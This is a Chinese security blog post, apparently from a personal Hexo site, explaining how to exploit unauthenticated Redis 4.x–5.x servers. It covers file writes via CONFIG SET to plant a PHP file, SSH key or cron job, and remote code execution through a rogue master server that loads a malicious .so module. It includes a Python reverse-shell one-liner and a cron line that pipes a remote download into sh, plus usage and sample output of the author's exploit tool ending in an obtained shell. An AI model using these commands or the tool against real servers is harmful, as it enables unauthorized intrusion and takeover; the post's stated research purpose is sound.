@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>Redis 未授权主从复制原理解析与实践 | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Redis 未授权主从复制原理解析与实践</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 2, 2019&nbsp;&nbsp;0:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/安全研究/">安全研究</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>旨在学习redis未授权的利用原理，仅供安全研究学习</p>
+<a id="more"></a>
+<h2 id="1-前期配置"><a class="markdownIt-Anchor" href="#1-前期配置"></a> 1 前期配置</h2>
+<p>首先配置一下<code>redis</code>环境。</p>
+<p>安装受影响的<code>redis</code>版本:</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line">$ tar xzf redis-5.0.5.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> redis-5.0.5</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<p>编辑<code>redis.conf</code>文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原：</span><br><span class="line">bind 127.0.0.1</span><br><span class="line">protected-mode yes</span><br><span class="line">修改后：</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>
+<p>启动<code>redis</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<p>外部连接<code>redis</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h [ip] -p [port]</span><br></pre></td></tr></table></figure>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-方法一键值存储任意写"><a class="markdownIt-Anchor" href="#21-方法一键值存储任意写"></a> 2.1 方法一：键值存储——任意写</h3>
+<p><code>redis</code>会将键值对写入到指定路径的文件内（当然包括之前已经存在的键值对），所以写入的文件若要有用，则需要一定的特殊条件(及容错性)，如：</p>
+<ol>
+<li><code>html</code>，<code>php</code>文件具有标签，可以忽略掉其他的键值。</li>
+<li><code>ssh</code>公钥文件</li>
+<li>任务计划 <code>crontab</code></li>
+</ol>
+<p>例子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">dir:</span><br><span class="line">/var/html/www</span><br><span class="line">dbfilename:</span><br><span class="line">evil.php</span><br><span class="line">value:</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># crontab</span></span><br><span class="line">dir:</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">dbfilename:</span><br><span class="line">evil.php</span><br><span class="line">value:</span><br><span class="line">\n* * * * * /usr/bin/python -c <span class="string">'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span>\n</span><br><span class="line"></span><br><span class="line">\n*/10 * * * *  curl -fsSL https://xxx.xxx.xxx.xxx/xxx/xx | sh\n</span><br><span class="line"><span class="comment"># -f：不输出错误</span></span><br><span class="line"><span class="comment"># -s: 静默不输出</span></span><br><span class="line"><span class="comment"># -S: -s 条件下输出错误</span></span><br><span class="line"><span class="comment"># -L: 跟踪重定向</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh</span></span><br><span class="line">dir:</span><br><span class="line">/root/.ssh/</span><br><span class="line">dbfilename:</span><br><span class="line">authorized_keys</span><br><span class="line">value:</span><br><span class="line">your_ssh_rsa</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Ubuntu 下执行 crontab 使用的是 sh , 而 sh 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有两种，一种就是使用 Python 调用 /bin/sh 反弹 shell ,还有一种可以尝试写 sh 文件，然后用 cron 去执行</p>
+</blockquote>
+<p>这个写文件具有一定的限制，比如在真实的生产环境，<code>redis</code>先前存在的键值对十分巨大，若执行写文件命令，则<strong>十分容易引起业务异常，宕机等严重情况</strong>。</p>
+<p>而使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS&gt; flushall</span><br></pre></td></tr></table></figure>
+<p>同样的，也将引起业务异常。</p>
+<p>所以这招只能在确认键值对不多的情况下使用，或者打CTF的时候。</p>
+<p>写入步骤：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REDIS&gt; CONFIG SET dir [absolute_path]</span><br><span class="line">REDIS&gt; CONFIG SET dbfilename [file_name]</span><br><span class="line">REDIS&gt; SET xxx <span class="string">'Content what you want'</span> <span class="comment"># key =&gt; xxx , value =&gt; 'Content what you want'</span></span><br><span class="line">REDIS&gt; SAVE</span><br></pre></td></tr></table></figure>
+<p>当然，填入的路径需要有写入的权限。</p>
+<div style="page-break-after: always;"></div>
+<h3 id="22-方法二主从复制rce"><a class="markdownIt-Anchor" href="#22-方法二主从复制rce"></a> 2.2 方法二：主从复制——RCE</h3>
+<h4 id="221-原理"><a class="markdownIt-Anchor" href="#221-原理"></a> 2.2.1 原理</h4>
+<p>redis支持主从复制以实现负载均衡的功能，其表现为<code>slaveof</code>命令设置一个redis服务器为另一个redis服务器的从服务器， 其中主、从服务器的数据相同，而从服务器只负责读，主服务器只负责写，通过读写分离可以减轻大流量的压力。通过主从复制，我们可以在一台可以未授权登录的redis服务器上任意地同步一个指定redis服务器的数据，即在本地写入一个RDB(Redis DataBase)数据库文件（并且还可以通过<code>CONFIG SET</code>指定另一个保存的名称，不污染当前数据库）。而在reids 4.x新增了模块功能之后，其可以通过外部拓展（<code>MODULE LOAD</code>命令）加载一个so模块，实现在redis中实现一个新的redis命令。由此我们可以构造出一个恶意的so文件，通过主从连接将其当做RDB文件保存在未授权的redis服务器上，然后通过<code>MODULE LOAD</code>命令加载我们恶意的so文件，得到一个新定义的恶意命令（如执行shell命令)。</p>
+<p>主从复制的大致攻击流程图如下：</p>
+<p><img src="/2019/12/02/Redis未授权主从复制原理解析与实践/redis%E6%9C%AA%E6%8E%88%E6%9D%83RCE.jpg" alt="redis未授权RCE"></p>
+<p>由于Redis在TCP上自己实现了一个简易的通信模式/协议，并且十分的简洁，我们可以根据如下图的主从复制的流程（仅构造红色虚线的<code>Master</code>响应即可），构造一个<code>Rogue Redis Server</code>回应对应的握手返回，并提供恶意so文件。</p>
+<p>Redis的主从复制握手过程如下所示：</p>
+<p><img src="/2019/12/02/Redis未授权主从复制原理解析与实践/c2f403bbf34208231ac2708fab387d9d_1_2_art.png" alt="Redis主从复制握手"></p>
+<p>Redis支持两种传输格式</p>
+<ol>
+<li>
+<p>明文格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET key value\n</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>以<code>\x0d\x0a</code>作为分隔符，经过类似格式化操作的格式。这么做比明文格式多了冗余检错机制，以防传输出错。</p>
+<p><img src="/2019/12/02/Redis未授权主从复制原理解析与实践/image-20191129111103847.png" alt="image-20191129111103847"></p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="222-命令"><a class="markdownIt-Anchor" href="#222-命令"></a> 2.2.2 命令</h4>
+<p><code>slaveof</code>命令会指定当前机器为<code>slave</code>，<code>master_ip</code>为主服务器，然后从<code>master_ip</code>处同步数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS&gt; SLAVEOF [master_ip]  [port]</span><br></pre></td></tr></table></figure>
+<p>关闭主从模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS&gt; SLAVEOF NO ONE</span><br></pre></td></tr></table></figure>
+<p>加载/取消加载模块命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REDIS&gt; MODULE LOAD [path]</span><br><span class="line">REDIS&gt; MODULE UNLOAD [new_command]</span><br></pre></td></tr></table></figure>
+<h4 id="223-利用"><a class="markdownIt-Anchor" href="#223-利用"></a> 2.2.3 利用</h4>
+<p>从原理可以看出Redis的传输协议十分的简洁，主从复制流程也较为松散，可以用python很容易的实现一个<code>Rogue Server</code>。虽然攻击原理图示中<code>Hacker</code>和<code>Rogue Server</code>是分开的，但是实现的时候是可以在同一个机器上实现的（其实就是一个未授权连接加上一个本地侦听的端口）。</p>
+<p>github上已经几个对其进行实现的小工具了，如<a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">Redis Rogue Server - Redis利用工具 - github</a></p>
+<p>这些工具都是比较简易的工具 ，用的恶意so都是<a href="https://github.com/RicterZ" target="_blank" rel="noopener">RicterZ</a>’提供的 <a href="https://github.com/RicterZ/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/RicterZ/RedisModules-ExecuteCommand</a> ，对<code>getshell</code>后的数据返回编码处理都不是很精确，时常会出现一些返回数据解码错误，然后需要重新连接的现象。当然这些都是比较poc向的工具（打打CTF还是够用的），要真正利用起来还得自己对数据处理还有重连部分重新写一下，具体也不难，大概十几二十行也能搞定。</p>
+<p>在实际研究过程中对<code>Rogue Server</code>握手结束后回复的 <code>+FULLRESYNC &lt;Z*40&gt; 1\r\n$\r\n$&lt;len&gt;\r\n&lt;pld&gt;</code>并不是很理解<img src="/2019/12/02/Redis未授权主从复制原理解析与实践/image-20191129112721762.png" alt="image-20191129112721762"></p>
+<p>直到看到了wettper对Redis主从复制源码的分析文章<a href="http://www.web-lovers.com/redis-source-replication.html" target="_blank" rel="noopener"> 渐进式解析 Redis 源码 - 复制 replication - wettper</a>才理解为什么。</p>
+<p>其实就是由于Redis的主从逻辑比较松散，从服务器(Slave)一般默认请求全量同步，而强制全量同步则会发送全量同步的请求<code>PSYNC ? -1</code>，若之前在这台主服务器同步过则拿出之前同步时的<code>runid</code>和复制偏移量<code>offset</code>发过去，即<code>PSYNC [runid]] [offset]</code>。（这里有些出入。源码逻辑看起来是这样的，但是实际上从服务器第一次同步一台新的主服务器也还是会发<code>PSYNC [runid]] [offset]</code>，详细代码见下<code>replication.c: line 1422</code>，但是并不影响我们构造恶意的服务器响应）</p>
+<p>但是这些<code>Slave</code>的请求并不重要，关键点在于<strong>主服务器不管你发什么请求，在源码逻辑中，反正决定是增量还是全量同步，是有<code>Master</code>端决定的</strong>。所以我们可以无脑的回复<code>+FULLRESYNC [runid] [offset]</code>来告诉从服务器我就是要全量同步。(此时的<code>runid</code>是服务器的<code>runid</code>，十六进制字符随意只要长度为40即可)。若是全量同步，则在这个<code>FULLRESYNC</code>响应之后的二进制流将被写入从服务器的RDB文件中。而在第一次未授权时我们已经设定了一个新的<code>dbfilename</code>，所以这个传过来的二进制流会顺利地、完整地当做RDB文件写入到我们指定的<code>dbfilename</code>中。一个完整的so文件就为我们后续的加载模块<code>MODULE LOAD [PATH]</code>提供了基础。</p>
+<p>这也是为什么payload可以为<code>&lt;Z*40&gt;</code>。</p>
+<blockquote>
+<p>状态机处于<code>REPL_STATE_SEND_PSYNC</code>状态的时候，从服务器会尝试向主服务器发起同步请求，一般请求分为 <strong>全量同步</strong>和<strong>增量同步</strong>；首次一般都是<strong>全量同步</strong>，而全量后的普通同步和由于网络等原因断开后重连的同步会选择增量同步秉着高效的原理，Redis v2.8 版本的时候引入了 PSYNC，主从可以增量同步，这样当主从链接短时间中断恢复后，无需做完整的RDB完全同步这种重量级操作。所以从服务器在连接上主服务器后首先尝试的是增量同步，因为有可能是断线后重连的情况，如果判断发现不是重连的情况不能进行增量同步，就进行一次全量同步。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* replication.c: line 1422 */</span></span><br><span class="line"><span class="comment">// 摘自 slaveTryPartialResynchronization()</span></span><br><span class="line"><span class="comment">/* slave 同步请求PSYNC [REP_ID] [OFFSET] 逻辑*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!read_reply) &#123;</span><br><span class="line">    <span class="comment">// 初始化master_initial_offset 为 -1，标记当前 run_id 和 offset偏移量 无效；后面进行全量同步的时候会根据响应值进行设置</span></span><br><span class="line">    server.master_initial_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 如果缓存不为空，则可以进行增量同步，证明为 断开重连的</span></span><br><span class="line">    <span class="keyword">if</span> (server.cached_master) &#123;</span><br><span class="line">        <span class="comment">// 从服务器在主服务器里的标识 runid</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * 但是奇怪的是,第一次连接一台新的主服务器也会进到这个分支</span></span><br><span class="line"><span class="comment">         * 日志会Trying a partial resynchronization (request %s:%s)</span></span><br><span class="line"><span class="comment">         * 发送十六进制的psync_replid 和 offset（=1） 而不是 ? 和 -1</span></span><br><span class="line"><span class="comment">         *（笔者注）</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        psync_replid = server.cached_master-&gt;replid;</span><br><span class="line">        <span class="comment">// 复制偏移量</span></span><br><span class="line">        <span class="built_in">snprintf</span>(psync_offset,<span class="keyword">sizeof</span>(psync_offset),<span class="string">"%lld"</span>, server.cached_master-&gt;reploff+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 记录日志</span></span><br><span class="line">        serverLog(LL_NOTICE,<span class="string">"Trying a partial resynchronization (request %s:%s)."</span>, psync_replid, psync_offset);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 全量同步</span></span><br><span class="line">        <span class="comment">// 记录日志</span></span><br><span class="line">        serverLog(LL_NOTICE,<span class="string">"Partial resynchronization not possible (no cached master)"</span>);</span><br><span class="line">        <span class="comment">// 从服务器在主服务器里的标识 runid</span></span><br><span class="line">        psync_replid = <span class="string">"?"</span>;</span><br><span class="line">        <span class="comment">// 复制偏移量</span></span><br><span class="line">        <span class="built_in">memcpy</span>(psync_offset,<span class="string">"-1"</span>,<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 发送 PSYNC 命令给主服务器，同时传递 runid 和 复制偏移量 信息</span></span><br><span class="line">    reply = sendSynchronousCommand(SYNC_CMD_WRITE,fd,<span class="string">"PSYNC"</span>,psync_replid,psync_offset,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 如果发送失败，则记录日志并 删除 读事件，返回错误</span></span><br><span class="line">    <span class="keyword">if</span> (reply != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        serverLog(LL_WARNING,<span class="string">"Unable to send PSYNC to master: %s"</span>,reply);</span><br><span class="line">        sdsfree(reply);</span><br><span class="line">        aeDeleteFileEvent(server.el,fd,AE_READABLE);</span><br><span class="line">        <span class="keyword">return</span> PSYNC_WRITE_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回 等待回复标识PSYNC_WAIT_REPLY，调用逻辑会将 read_reply 设置为1，然后再次调用该函数，执行下面的读部分</span></span><br><span class="line">    <span class="keyword">return</span> PSYNC_WAIT_REPLY;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="3动手实践"><a class="markdownIt-Anchor" href="#3动手实践"></a> 3.动手实践</h2>
+<p>链接：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server" target="_blank" rel="noopener">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p>
+<p>对当前实现<code>Rogue Server</code>的<code>python</code>利用代码和<code>module.c</code>源码进行了学习与改进，新增了一些红队测试特性以如攻击请求方与<code>Rogue Server</code>分离，防止乱码，可写目录探测，恢复环境、清除已加载恶意模块等等。</p>
+<p><code>Redis Rogue Server</code>的涉及主要技术为Redis的<strong>主从复制</strong>以及<strong>外部模块加载</strong>，攻击核心思路如下：</p>
+<p><img src="/2019/12/02/Redis未授权主从复制原理解析与实践/redis%E6%9C%AA%E6%8E%88%E6%9D%83RCE.jpg" alt="redis-rogue-server.jpg"></p>
+<h3 id="31-红队测试特性"><a class="markdownIt-Anchor" href="#31-红队测试特性"></a> 3.1 红队测试特性</h3>
+<ul>
+<li>重写外部模块内存申请，避免被测试Redis服务器崩溃。</li>
+<li>更稳定的直连Shell与反弹Shell</li>
+<li>单独<code>Rogue Server</code>模式</li>
+<li><code>Redis-Cli</code>与<code>Rogue Server</code>分离模式</li>
+<li>可写路径尝试</li>
+<li>添加标准错误重定向</li>
+<li>优化Shell解码问题</li>
+<li><code>so</code>随机名称、加载模块名称变更</li>
+<li>模块卸载、<code>so</code>文件清理，保持服务器的服务正常</li>
+<li>Redis pass认证</li>
+</ul>
+<p><strong>详看源码</strong></p>
+<h3 id="32-适用范围"><a class="markdownIt-Anchor" href="#32-适用范围"></a> 3.2 适用范围</h3>
+<p>Redis 4.x &lt;= 5.x</p>
+<h3 id="33-usage"><a class="markdownIt-Anchor" href="#33-usage"></a> 3.3 Usage</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python3 redis_rogue_server.py -h</span><br><span class="line">usage: python3 redis_rogue_server.py -rhost [target_ip] -lhost [rogue_ip] [Extend options]</span><br><span class="line"></span><br><span class="line"> Redis unauthentication <span class="built_in">test</span> tool.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>      show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -rhost RHOST    Target host.</span><br><span class="line">  -rport RPORT    Target port. [default: 6379]</span><br><span class="line">  -lhost LHOST    Rogue redis server, <span class="built_in">which</span> target host can reach it.</span><br><span class="line">                  THIS IP MUST BE ACCESSIBLE BY TARGET!</span><br><span class="line">  -lport LPORT    Rogue redis server listen port. [default: 15000]</span><br><span class="line">  -passwd PASSWD  Target redis password.</span><br><span class="line">  -path SO_PATH   <span class="string">"Evil"</span> so path. [default: module.so]</span><br><span class="line">  -t RTIMEOUT     Rogue server response timeout. [default: 3]</span><br><span class="line">  -s              Separate mod.</span><br><span class="line">                  Whether Redis-Cli(This ip) and rogue Server(Can be other ip) are separated</span><br><span class="line">                  rogue Server port listens locally by default, use flag -s shut down <span class="built_in">local</span> port <span class="keyword">if</span> lport conflict.</span><br><span class="line">  -v              Verbose Mode.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2</span><br><span class="line">  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2 -rport 6379 -lport 15000</span><br><span class="line"></span><br><span class="line">Only Rogue Server Mode:</span><br><span class="line">  redis_rogue_server.py -v</span><br></pre></td></tr></table></figure>
+<h3 id="34-example"><a class="markdownIt-Anchor" href="#34-example"></a> 3.4 Example</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ python3 redis_rogue_server.py  -rhost 192.168.229.136 -lhost 192.168.229.150 -v</span><br><span class="line">[*] Init connection...</span><br><span class="line">[+] Target accessible!</span><br><span class="line">[*] Exploit Step-1.</span><br><span class="line">[+] RDB dir: /home/<span class="built_in">test</span>/Desktop/redis-5.0.7</span><br><span class="line">[*] Done.</span><br><span class="line">[+] Accept connection from 192.168.229.136:44674</span><br><span class="line">[&gt;&gt;]b<span class="string">'*1\r\n$4\r\nPING\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+PONG\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+OK\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+OK\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*3\r\n$5\r\nPSYNC\r\n$40\r\ne46ef23509ec51bb952dec34cb84e6c08388e5eb\r\n$1\r\n1\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+FULLRESYNC d2b79a2fbd16c050cdf136838f67093efb76509 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&gt;\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00...'</span></span><br><span class="line">[*] The Rogue Server Finished Sending the Fake Master Response.</span><br><span class="line">[*] Wait <span class="keyword">for</span> redis IO and trans flow close...</span><br><span class="line">[*] Exploit Step-2.</span><br><span class="line">[*] Done.</span><br><span class="line">[+] It may crash target redis cause transfer large data, be careful.</span><br><span class="line">[?] Shell? [i]interactive,[r]reverse:i</span><br><span class="line">[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!</span><br><span class="line">[+] =========================== Shell ============================= </span><br><span class="line">$ id</span><br><span class="line">uid=1000(<span class="built_in">test</span>) gid=1000(<span class="built_in">test</span>) groups=1000(<span class="built_in">test</span>),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Plz <span class="built_in">wait</span> <span class="keyword">for</span> auto <span class="built_in">exit</span>. Cleaning.... </span><br><span class="line">[!] DO NOT SHUTDOWN IMMEDIATELY!</span><br><span class="line">[*] Done.</span><br></pre></td></tr></table></figure>
